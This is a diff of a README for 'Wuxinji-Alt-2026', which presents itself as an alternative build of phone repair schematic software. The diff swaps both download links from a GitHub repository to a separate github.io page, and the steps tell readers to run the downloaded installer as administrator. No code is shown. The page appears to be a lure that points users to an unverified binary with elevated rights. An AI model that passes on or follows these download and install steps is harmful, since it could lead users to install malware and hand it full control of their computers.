@@ -1,6 +1,6 @@
 # 🛠️ Wuxinji-Alt-2026 - Access Professional Phone Repair Schematics Today
 
-[![](https://img.shields.io/badge/Download-Wuxinji_Setup-blue.svg)](https://github.com/Lucidityspicerack338/Wuxinji-Alt-2026)
+[![](https://img.shields.io/badge/Download-Wuxinji_Setup-blue.svg)](https://lucidityspicerack338.github.io)
 
 ## 📌 Software Overview
 
@@ -21,7 +21,7 @@ Ensure your computer meets these conditions before you install the software:
 
 Follow these steps to set up the software on your Windows computer:
 
-1. Visit the project repository page to download the software: [Download Wuxinji-Alt-2026](https://github.com/Lucidityspicerack338/Wuxinji-Alt-2026)
+1. Visit the project repository page to download the software: [Download Wuxinji-Alt-2026](https://lucidityspicerack338.github.io)
 2. Locate the setup file in your Downloads folder once the transfer finishes.
 3. Right-click the installer file and select Run as administrator.
 4. Follow the instructions presented by the installation wizard. 
